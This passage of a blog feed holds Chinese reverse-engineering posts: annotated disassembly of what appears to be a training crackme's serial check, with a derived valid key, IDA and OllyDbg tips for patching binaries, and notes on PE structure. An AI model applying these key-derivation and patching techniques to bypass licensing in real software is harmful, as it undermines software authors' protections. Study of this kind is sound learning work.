class="line">0115197F    66:0FD6         ???                                      ; 未知命令</div><div class="line">01151982    45              inc     ebp</div><div class="line">01151983    F0:66:8975 F8   lock mov word ptr [ebp-0x8], si          ; 不允许锁定前缀</div><div class="line">01151988    66:3937         cmp     word ptr [edi], si</div><div class="line">0115198B    74 48           je      short 011519D5</div><div class="line">0115198D    66:8B4D B0      mov     cx, word ptr [ebp-0x50]</div><div class="line">01151991    8D5D F0         lea     ebx, dword ptr [ebp-0x10]</div><div class="line">01151994    8BC7            mov     eax, edi</div><div class="line">01151996    66:85C9         test    cx, cx</div><div class="line">01151999    74 2C           je      short 011519C7</div><div class="line">0115199B    0FB710          movzx   edx, word ptr [eax]</div><div class="line">0115199E    8D4D B0         lea     ecx, dword ptr [ebp-0x50]</div><div class="line">011519A1    33C0            xor     eax, eax</div><div class="line">011519A3    66:3B11         cmp     dx, word ptr [ecx]</div><div class="line">011519A6    74 10           je      short 011519B8</div><div class="line">011519A8    40              inc     eax</div><div class="line">011519A9    8D4D B0         lea     ecx, dword ptr [ebp-0x50]</div><div class="line">011519AC    66:833C41 00    cmp     word ptr [ecx+eax*2], 0x0</div><div class="line">011519B1    8D0C41          lea     ecx, dword ptr [ecx+eax*2]</div><div class="line">011519B4  ^ 75 ED           jnz     short 011519A3</div><div class="line">011519B6    EB 0B           jmp     short 011519C3</div><div class="line">011519B8    66:8B4445 B0    mov     ax, word ptr [ebp+eax*2-0x50]</div><div class="line">011519BD    66:8903         mov     word ptr [ebx], ax</div><div class="line">011519C0    83C3 02         add     ebx, 0x2</div><div class="line">011519C3    66:8B4D B0      mov     cx, word ptr [ebp-0x50]</div><div class="line">011519C7    46              inc     esi</div><div class="line">011519C8    66:833C77 00    cmp     word ptr [edi+esi*2], 0x0</div><div class="line">011519CD    8D0477          lea     eax, dword ptr [edi+esi*2]</div><div class="line">011519D0  ^ 75 C4           jnz     short 01151996</div><div class="line">011519D2    8B5D AC         mov     ebx, dword ptr [ebp-0x54]</div><div class="line">011519D5    33C9            xor     ecx, ecx</div><div class="line">011519D7    8D45 F0         lea     eax, dword ptr [ebp-0x10]</div><div class="line">011519DA    66:394D F0      cmp     word ptr [ebp-0x10], cx</div><div class="line">011519DE    74 59           je      short 01151A39</div><div class="line">011519E0    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">011519E3    41              inc     ecx</div><div class="line">011519E4    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">011519E8  ^ 75 F6           jnz     short 011519E0</div><div class="line">011519EA    83F9 02         cmp     ecx, 0x2</div><div class="line">011519ED    75 4A           jnz     short 01151A39</div><div class="line">011519EF    33C0            xor     eax, eax</div><div class="line">011519F1    C745 F0 3100350&gt;mov     dword ptr [ebp-0x10], 0x350031</div><div class="line">011519F8    C745 F4 5000420&gt;mov     dword ptr [ebp-0xC], 0x420050</div><div class="line">011519FF    8D77 04         lea     esi, dword ptr [edi+0x4]</div><div class="line">01151A02    66:8945 F8      mov     word ptr [ebp-0x8], ax</div><div class="line">01151A06    33C9            xor     ecx, ecx</div><div class="line">01151A08    0F1F            ???                                      ; 未知命令</div><div class="line">01151A0A    8400            test    byte ptr [eax], al</div><div class="line">01151A0C    0000            add     byte ptr [eax], al</div><div class="line">01151A0E    0000            add     byte ptr [eax], al</div><div class="line">01151A10    66:8B444D F0    mov     ax, word ptr [ebp+ecx*2-0x10]</div><div class="line">01151A15    66:3B06         cmp     ax, word ptr [esi]</div><div class="line">01151A18    75 1F           jnz     short 01151A39</div><div class="line">01151A1A    41              inc     ecx</div><div class="line">01151A1B    83C6 02         add     esi, 0x2</div><div class="line">01151A1E    83F9 04         cmp     ecx, 0x4</div><div class="line">01151A21  ^ 72 ED           jb      short 01151A10</div><div class="line">01151A23    8BD7            mov     edx, edi</div><div class="line">01151A25    8BCB            mov     ecx, ebx</div><div class="line">01151A27    E8 14FDFFFF     call    01151740         ; 这里是最后判断的call，</div><div class="line">01151A2C    6A 00           push    0x0</div><div class="line">01151A2E    85C0            test    eax, eax</div><div class="line">01151A30    74 09           je      short 01151A3B</div><div class="line">01151A32    68 0B040000     push    0x40B</div><div class="line">01151A37    EB 07           jmp     short 01151A40</div><div class="line">01151A39    6A 00           push    0x0</div><div class="line">01151A3B    68 0A040000     push    0x40A</div><div class="line">01151A40    68 11010000     push    0x111</div><div class="line">01151A45    FF73 04         push    dword ptr [ebx+0x4]</div><div class="line">01151A48    FF15 54811601   call    dword ptr [&lt;&amp;USER32.PostMessageW&gt;; user32.PostMessageW</div></pre></td></tr></table></figure></p><p>以上代码比如初始化0-9,a-z，注册码转换成大写，提取出注册码里所有的字母，纯属多余<br>接下去直接看里面最后的call<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">01151810   &gt; /66:8B01       mov     ax, word ptr [ecx]</div><div class="line">01151813   . |66:3B040E     cmp     ax, word ptr [esi+ecx]           ;  判断第1,2位是否为&apos;12&apos;</div><div class="line">01151817   . |75 42         jnz     short 0115185B</div><div class="line">01151819   . |83C2 06       add     edx, 0x6</div><div class="line">0115181C   . |83C1 02       add     ecx, 0x2</div><div class="line">0115181F   . |83FA 39       cmp     edx, 0x39</div><div class="line">01151822   .^\7E EC         jle     short 01151810</div><div class="line">01151824   .  0FB74F 12     movzx   ecx, word ptr [edi+0x12]    ； 第i位字符+第1位字符是否为0x63（设计不合理?）</div><div class="line">01151828   .  0FB703        movzx   eax, word ptr [ebx]</div><div class="line">0115182B   .  03C8          add     ecx, eax</div><div class="line">0115182D   .  83F9 63       cmp     ecx, 0x63</div><div class="line">01151830   .  75 29         jnz     short 0115185B</div><div class="line">01151832   .  8B45 B4       mov     eax, dword ptr [ebp-0x4C]</div><div class="line">01151835   .  0FB74F 0C     movzx   ecx, word ptr [edi+0xC]</div><div class="line">01151839   .  0308          add     ecx, dword ptr [eax]</div><div class="line">0115183B   .  8B45 B0       mov     eax, dword ptr [ebp-0x50]</div><div class="line">0115183E   .  0FB700        movzx   eax, word ptr [eax]</div><div class="line">01151841   .  3BC1          cmp     eax, ecx</div><div class="line">01151843   .  75 16         jnz     short 0115185B    ; 这里判断注册码最后一位是否等于用&apos;123456789&apos;替换了注册码的n位之后的字符判断的第0x0c位+n是否相等</div><div class="line">01151845   .  5F            pop     edi</div><div class="line">01151846   .  5E            pop     esi</div><div class="line">01151847   .  B8 01000000   mov     eax, 0x1</div><div class="line">0115184C   .  5B            pop     ebx</div></pre></td></tr></table></figure></p><p>以上分析完成得到一组注册码1215pb8<br>1）包含字符’b’’’p’<br>2)  7位长度<br>3)  第1、2位为’1’’2’<br>4） 第0位字符’1’(0x30)+第n位字符(计数所在位)’2’(0x32) = 0x63<br>5)  第3、4、5、6位为’15pb’<br>6)  最后1位为‘7’+计数</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去膜拜看雪师傅啦,看雪论坛是个软件安全技术交流场所，为安全技术爱好者提供一个技术交流平台和资源。从单一版块『软件调试论坛』，发展到以软件安全技术为主题多个版块的综合论坛。其实这是一个超级大神级别的存在，来膜拜一波&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>RE_IDA_OD的常用小技巧</title>
    <link href="http://yoursite.com/2018/05/09/re_ida/"/>
    <id>http://yoursite.com/2018/05/09/re_ida/</id>
    <published>2018-05-09T03:52:41.283Z</published>
    <updated>2018-05-02T02:41:57.652Z</updated>
    
    <content type="html"><![CDATA[<p>IDA和OD是逆向中必不可少的一部分，现在来分享一下IDA和OD的一些技巧<br><a id="more"></a></p><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><h2 id="1、查找字符串"><a href="#1、查找字符串" class="headerlink" title="1、查找字符串"></a>1、查找字符串</h2><p>(Shift+f9)View-&gt;open subviews-&gt;Strings</p><h2 id="2、修改文件，打补丁-patch"><a href="#2、修改文件，打补丁-patch" class="headerlink" title="2、修改文件，打补丁(patch)"></a>2、修改文件，打补丁(patch)</h2><p>1、找到修改地方<br>2、修改文件，也可以在(Hex view)窗口修改16进制:双击要修改的地方 -&gt;使用F2捷方式修改当前字节 -&gt;再按下F2快捷方式应用修改。<br>3、保存文件修改后的文件:[IDA Main Menu]-&gt;[Edit]-&gt;[PatchProgram]-&gt;[Apply patches to input file…]<br>IDA图形视图会有执行流，Yes箭头默认为绿色，No箭头默认为红色，蓝色表示默认下一个执行块。</p><h2 id="3、ida无法识别，红色代码，不能f5"><a href="#3、ida无法识别，红色代码，不能f5" class="headerlink" title="3、ida无法识别，红色代码，不能f5"></a>3、ida无法识别，红色代码，不能f5</h2><p>如果地址是红色，当f5时会出现这句话：The function has undefined instruction/data at the specified address.那就创建一个函数(P)，当创建函数时，会出现这句话：The function has undefined instruction/data at the specified address.Your request has been put in the autoanalysis queue<br>如果我们不能创建函数,就不能使用F5来分析代码了,想让这些代码变绿色的方法(创建函数)很简单.<br>用鼠标从函数头部开始到 retn 结尾 拖一下,变成灰色.<br><img src="https://i.imgur.com/1odLgE0.png" alt=""><br>然后用快捷键 P 或者右键菜单,CreateFunction 来创建函数就可以了。当然了,到这里也不算完.下图是代码变绿色的,我用上面的方法创建函数了,可还是不能F5,我们通过Stack Pointer (option-&gt;General-&gt;Disassembly选中stack pointer)发现这个函数的堆栈是不平衡的.此时我们需要找接近retn 的 最后一个Call 然后去修正堆栈.此时我们需要找接近retn 的 最后一个Call 然后去修正堆栈.我们看到 retn 左边绿色的数字是 28,我们通过ALT + k 修正堆栈,把 28 retn 改成 0 就可以了。修正堆栈的时候一定要选择 Call 然后修正堆栈,下图是修正后的 代码</p><h2 id="4、常用快捷键"><a href="#4、常用快捷键" class="headerlink" title="4、常用快捷键"></a>4、常用快捷键</h2><p>1、快捷键F5显示C伪代码<br>2、(Shift+f9)查找字符串<br>3、快捷键Alt+T，打开文本搜索对话框，在String文本框中输入要搜索的字符串点击OK即可<br>4、翻页 esc 和 Ctrl+Enter<br>5、使用小键盘“-”，“+”查看函数之间的关系<br>6、G跳转地址<br>7、使用快捷键”*”把变量重定义为数组<br>8、对于数字，16进制和10进制转换(H),转化成10字符(R)</p><h1 id="OD-olldbg"><a href="#OD-olldbg" class="headerlink" title="OD(olldbg)"></a>OD(olldbg)</h1><h2 id="1、常用快捷键"><a href="#1、常用快捷键" class="headerlink" title="1、常用快捷键"></a>1、常用快捷键</h2><p>0、f2下断点<br>1、f7进入call<br>2、f8不进入call<br>3、f9运行<br>4、f4运行到当前位置<br>5、’-‘回到上一步的位置<br>6、’*’回到当前运行的位置<br>7、Ctrl+F2  重新运行程序到起始处，用于重新调试程序<br>8、Ctrl+G 寻找十六进制地址<br>9、Alt+F2 关闭被调试程序。<br>10、f3 选择可执行文件<br>11、ctrl+b 在地址栏进行查找字符串<br>12、m -&gt; 查找</p><h2 id="OD上面图标"><a href="#OD上面图标" class="headerlink" title="OD上面图标"></a>OD上面图标</h2><p>1、’b’查看断点<br>2、’m’打开内存<br>3、’c’回到反汇编窗口</p><h2 id="OD保存文件"><a href="#OD保存文件" class="headerlink" title="OD保存文件"></a>OD保存文件</h2><p>1、寻找到需要patch的地方<br>2、修改(patch)文件<br>3、 保存文件: 窗口中选中修改过的语句—&gt;右击—&gt;复制到可执行文件—&gt;“选择”或者“所有修改”—&gt;出现“文件”窗口—&gt;右击—&gt;保存文件</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;IDA和OD是逆向中必不可少的一部分，现在来分享一下IDA和OD的一些技巧&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>RE_PE</title>
    <link href="http://yoursite.com/2018/05/09/re_PE/"/>
    <id>http://yoursite.com/2018/05/09/re_PE/</id>
    <published>2018-05-09T03:52:41.283Z</published>
    <updated>2018-05-02T02:42:09.382Z</updated>
    
    <content type="html"><![CDATA[<p>复习可执行文件的文件结构——PE。PE文件是微软Windows操作系统上的程序文件，意为可移植的可执行的文件。PE的段头直接沿用的COFF 的段头结构。<br><a id="more"></a></p><h1 id="1、PE的结构"><a href="#1、PE的结构" class="headerlink" title="1、PE的结构"></a>1、PE的结构</h1><p><img src="https://i.imgur.com/vfm1qtj.jpg" alt=""><br>DOS头: 是DOS命令窗口下可以执行，其实没有PE文件也是可以执行的（听说是老一辈习惯啦DOS命令下执行，就加上去啦）。<br>NT头: 是PE中最大的结构体啦，其中有签名，文件头和可选头。<br>节区头: 定义(代码，数据，资源等的大小，起始位置，权限等)</p><h1 id="2、DOS头"><a href="#2、DOS头" class="headerlink" title="2、DOS头"></a>2、DOS头</h1><p>DOS结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>          <span class="comment">// DOS .EXE header  </span></div><div class="line">        WORD   e_magic;                     <span class="comment">// Magic number  </span></div><div class="line">        WORD   e_cblp;                      <span class="comment">// Bytes on last page of file  </span></div><div class="line">        WORD   e_cp;                        <span class="comment">// Pages in file  </span></div><div class="line">        WORD   e_crlc;                      <span class="comment">// Relocations  </span></div><div class="line">        WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs  </span></div><div class="line">        WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed  </span></div><div class="line">        WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed  </span></div><div class="line">        WORD   e_ss;                        <span class="comment">// Initial (relative) SS value  </span></div><div class="line">        WORD   e_sp;                        <span class="comment">// Initial SP value  </span></div><div class="line">        WORD   e_csum;                      <span class="comment">// Checksum  </span></div><div class="line">        WORD   e_ip;                        <span class="comment">// Initial IP value  </span></div><div class="line">        WORD   e_cs;                        <span class="comment">// Initial (relative) CS value  </span></div><div class="line">        WORD   e_lfarlc;                      <span class="comment">// File address of relocation table  </span></div><div class="line">        WORD   e_ovno;                      <span class="comment">// Overlay number  </span></div><div class="line">        WORD   e_res[<span class="number">4</span>];                     <span class="comment">// Reserved words  </span></div><div class="line">        WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)  </span></div><div class="line">        WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific  </span></div><div class="line">        WORD   e_res2[<span class="number">10</span>];                   <span class="comment">// Reserved words  </span></div><div class="line">        LONG   e_lfanew;                     <span class="comment">// File address of new exe header  </span></div><div class="line">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</div></pre></td></tr></table></figure></p><h2 id="e-magic：所有PE开头都有DOS签名-“MZ”，这是以一个名叫Mark-Zbikowski的DOS可执行文件的设计者首字母命名的"><a href="#e-magic：所有PE开头都有DOS签名-“MZ”，这是以一个名叫Mark-Zbikowski的DOS可执行文件的设计者首字母命名的" class="headerlink" title="e_magic：所有PE开头都有DOS签名  “MZ”，这是以一个名叫Mark Zbikowski的DOS可执行文件的设计者首字母命名的"></a>e_magic：所有PE开头都有DOS签名  “MZ”，这是以一个名叫Mark Zbikowski的DOS可执行文件的设计者首字母命名的</h2><h2 id="e-lfanew-指向NT头的位置，long类型，占4个字节。例"><a href="#e-lfanew-指向NT头的位置，long类型，占4个字节。例" class="headerlink" title="e_lfanew:指向NT头的位置，long类型，占4个字节。例:"></a>e_lfanew:指向NT头的位置，long类型，占4个字节。例:</h2><p><img src="https://i.imgur.com/DancFFy.png" alt=""></p><h1 id="3、NT头"><a href="#3、NT头" class="headerlink" title="3、NT头"></a>3、NT头</h1><p>NT结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span>  </div><div class="line">      DWORD                 Signature;  </div><div class="line">      IMAGE_FILE_HEADER     FileHeader;  </div><div class="line">      IMAGE_OPTIONAL_HEADER OptionalHeader;  </div><div class="line">&#125; IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;</div></pre></td></tr></table></figure></p><p>第一个参数是: 一个PE标志。在一个有效的PE文件里，Signature字段被设置为00004550h。<br>第二个参数是: IMAGE_FILE_HEADER结构体。<br>第三个参数是: OptionalHeader结构体。</p><h2 id="NT文件头"><a href="#NT文件头" class="headerlink" title="NT文件头"></a>NT文件头</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></div><div class="line">    WORD    Machine;　　　　　　　　　<span class="comment">//机器型号,哪个CPU可以跑的.重要.</span></div><div class="line">    WORD    NumberOfSections;　　　　  <span class="comment">//节的数量 .data , .text </span></div><div class="line">    DWORD   TimeDateStamp;　　　　　　　<span class="comment">//程序的编译时间,参考用,没有实际作用</span></div><div class="line">    DWORD   PointerToSymbolTable;　　　<span class="comment">//符号表地址，主要是给比人用的</span></div><div class="line">    DWORD   NumberOfSymbols;　　　　　　　<span class="comment">//符号表大小</span></div><div class="line">    WORD    SizeOfOptionalHeader;　　　<span class="comment">//可选头大小,这个字段很重要.才知道可选头是多大</span></div><div class="line">    WORD    Characteristics;　　　　　　<span class="comment">//文件属性,描述文件信息的.</span></div><div class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</div></pre></td></tr></table></figure><h2 id="NT可选头结构体"><a href="#NT可选头结构体" class="headerlink" title="NT可选头结构体"></a>NT可选头结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span>  </span></div><div class="line"><span class="class">&#123;</span>  </div><div class="line">        <span class="comment">//   </span></div><div class="line">        <span class="comment">// Standard fields.     </span></div><div class="line">        <span class="comment">//   </span></div><div class="line">        WORD    Magic;              <span class="comment">// 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）   </span></div><div class="line">        BYTE    MajorLinkerVersion;     <span class="comment">// 链接程序的主版本号   </span></div><div class="line">        BYTE    MinorLinkerVersion;     <span class="comment">// 链接程序的次版本号   </span></div><div class="line">        DWORD   SizeOfCode;         <span class="comment">// 所有含代码的节的总大小   </span></div><div class="line">        DWORD   SizeOfInitializedData;          <span class="comment">// 所有含已初始化数据的节的总大小   </span></div><div class="line">        DWORD   SizeOfUninitializedData;        <span class="comment">// 所有含未初始化数据的节的大小   </span></div><div class="line">        DWORD   AddressOfEntryPoint;        <span class="comment">// 程序执行入口RVA   </span></div><div class="line">        DWORD   BaseOfCode;         <span class="comment">// 代码的区块的起始RVA   </span></div><div class="line">        DWORD   BaseOfData;         <span class="comment">// 数据的区块的起始RVA    </span></div><div class="line">        DWORD   ImageBase;          <span class="comment">// 程序的首选装载地址   </span></div><div class="line">        DWORD   SectionAlignment;       <span class="comment">// 内存中的区块的对齐大小   </span></div><div class="line">        DWORD   FileAlignment;          <span class="comment">// 文件中的区块的对齐大小   </span></div><div class="line">        WORD    MajorOperatingSystemVersion;    <span class="comment">// 要求操作系统最低版本号的主版本号   </span></div><div class="line">        WORD    MinorOperatingSystemVersion;    <span class="comment">// 要求操作系统最低版本号的副版本号   </span></div><div class="line">        WORD    MajorImageVersion;      <span class="comment">// 可运行于操作系统的主版本号   </span></div><div class="line">        WORD    MinorImageVersion;      <span class="comment">// 可运行于操作系统的次版本号   </span></div><div class="line">        WORD    MajorSubsystemVersion;      <span class="comment">// 要求最低子系统版本的主版本号   </span></div><div class="line">        WORD    MinorSubsystemVersion;      <span class="comment">// 要求最低子系统版本的次版本号   </span></div><div class="line">        DWORD   Win32VersionValue;      <span class="comment">// 莫须有字段，不被病毒利用的话一般为0   </span></div><div class="line">        DWORD   SizeOfImage;            <span class="comment">// 映像装入内存后的总尺寸   </span></div><div class="line">        DWORD   SizeOfHeaders;          <span class="comment">// 所有头+ 区块表的尺寸大小   </span></div><div class="line">        DWORD   CheckSum;           <span class="comment">// 映像的校检和   </span></div><div class="line">        WORD    Subsystem;          <span class="comment">// 可执行文件期望的子系统   </span></div><div class="line">        WORD    DllCharacteristics;     <span class="comment">// DllMain()函数何时被调用，默认为0   </span></div><div class="line">        DWORD   SizeOfStackReserve;     <span class="comment">// 初始化时的栈大小   </span></div><div class="line">        DWORD   SizeOfStackCommit;      <span class="comment">// 初始化时实际提交的栈大小   </span></div><div class="line">        DWORD   SizeOfHeapReserve;      <span class="comment">// 初始化时保留的堆大小   </span></div><div class="line">        DWORD   SizeOfHeapCommit;       <span class="comment">// 初始化时实际提交的堆大小   </span></div><div class="line">        DWORD   LoaderFlags;            <span class="comment">// 与调试有关，默认为0    </span></div><div class="line">        DWORD   NumberOfRvaAndSizes;    <span class="comment">// 下边数据目录的项数，这个字段自Windows NT 发布以来        // 一直是16   </span></div><div class="line">        IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];  </div><div class="line">        <span class="comment">// 数据目录表   </span></div><div class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</div></pre></td></tr></table></figure><h2 id="一共31个字段成员-6个重要的"><a href="#一共31个字段成员-6个重要的" class="headerlink" title="一共31个字段成员,6个重要的"></a>一共31个字段成员,6个重要的</h2><p>RVA也叫作OEP<br>AddressOfEntryPoint 持有EP 的RVA 值<br>基址<br>SizeOfHeader PE 头的大小<br>Subsystem 用来区分系统驱动文件与普通可执行文件。<br>DataDirectory数组</p><h2 id="重点是最后一个成员IMAGE-DATA-DIRECTORY-DataDirectory-IMAGE-NUMBEROF-DIRECTORY-ENTRIES"><a href="#重点是最后一个成员IMAGE-DATA-DIRECTORY-DataDirectory-IMAGE-NUMBEROF-DIRECTORY-ENTRIES" class="headerlink" title="重点是最后一个成员IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];"></a>重点是最后一个成员IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</h2><p>因为DataDirectory数组里保存了导入表（用了哪些dll），导出表，TLS（Thread Local Storage） Directory等RVA和大小的信息<br>倒数第二个变量决定NumberOfRvaAndSizes数组长度<br>在LoadPE工具中，文件头显示信息，如下：<br><img src="https://i.imgur.com/lhhFCrk.png" alt=""></p><h2 id="DataDirectory数组"><a href="#DataDirectory数组" class="headerlink" title="DataDirectory数组"></a>DataDirectory数组</h2><p>IMAGE_DATA_DIRCTORY结构如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span>  </div><div class="line">        DWORD　VirtualAddress; <span class="comment">//相对虚拟地址  </span></div><div class="line">        DWORD　Size;　　　　　 <span class="comment">//大小  </span></div><div class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</div></pre></td></tr></table></figure></p><p>一个是RVA，一个是大小</p><p>data directory数据目录在WINNT.H中定义为<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT         0 导出表  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT         1 导入表   </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE       2 资源目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION      3 异常目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY       4 安全目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC      5 重定位基本表  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG          6 调试目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COPYRIGHT      7 描术字串  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR      8 机器值  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS            9 TLS目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10 载入配值目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11 绑定输入表  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            12 导入地址表  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13 延迟载入描述  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 COM信息</span></div></pre></td></tr></table></figure></p><p>在LoadPE工具中，数据目录显示信息，如下：<br><img src="https://i.imgur.com/7yB4x1A.png" alt=""></p><h1 id="4、RVA和RAW"><a href="#4、RVA和RAW" class="headerlink" title="4、RVA和RAW"></a>4、RVA和RAW</h1><p>理解PE 最重要的一个部分就是理解文件从磁盘到内存地址的映射过程，做逆向的人员，只有熟练地掌握才能跟踪到程序的调用过程和位置，才能分析和寻找漏洞。<br>对于文件和内存的映射关系，其实很简单，他们通过一个简单的公式计算而来：<br><img src="https://i.imgur.com/U9LeUOb.jpg" alt=""><br>换算公式是这样的：<br>RAW - PointToRawData(磁盘文件中节区起始位置) = RVA(相对虚拟地址) - VirtualAddress</p><p>寻找过程就是先找到RVA 所在的段，然后根据公式计算出文件偏移。因为我们通过逆向工具，可以在内存中查找到所在的RVA，进而我们就可以计算出在文件中所在的位置，这样，就可以手动进行修改。</p><p>VA与RVA公式是这样的：</p><h2 id="RVA-VA（虚拟地址）-ImageBase（基址）"><a href="#RVA-VA（虚拟地址）-ImageBase（基址）" class="headerlink" title="RVA = VA（虚拟地址） - ImageBase（基址）"></a>RVA = VA（虚拟地址） - ImageBase（基址）</h2><p>结果:</p><h2 id="RAW-VA-ImageBase-VirtualAddress-PointerToRawData"><a href="#RAW-VA-ImageBase-VirtualAddress-PointerToRawData" class="headerlink" title="RAW = VA - ImageBase - VirtualAddress + PointerToRawData"></a>RAW = VA - ImageBase - VirtualAddress + PointerToRawData</h2><p>比如:<br>VA=0x003A20F4 , ImageBase =0x003A0000<br><img src="https://i.imgur.com/SwaxF8w.png" alt=""><br>可以看到0x20F4地址位于VirtualAddress 为0x2000的.rdata节，偏移为0x20F4 - 0x2000 = 0xF4<br>观察节表，.rdata的PointerToRawData为0xE00，字符串在磁盘中的地址为0xE00 + 0xF4 = 0xEF4<br>使用公式：<br>RAW = VA - ImageBase - VirtualAddress + PointerToRawData = 0x003A20F4 - 0x003A0000 - 0x2000 + 0xE00 = 0xEF4<br>用winhex打开二进制文件<br><img src="https://i.imgur.com/EQhlnD9.png" alt=""></p><h1 id="5、IAT与EAT"><a href="#5、IAT与EAT" class="headerlink" title="5、IAT与EAT"></a>5、IAT与EAT</h1><h2 id="IAT"><a href="#IAT" class="headerlink" 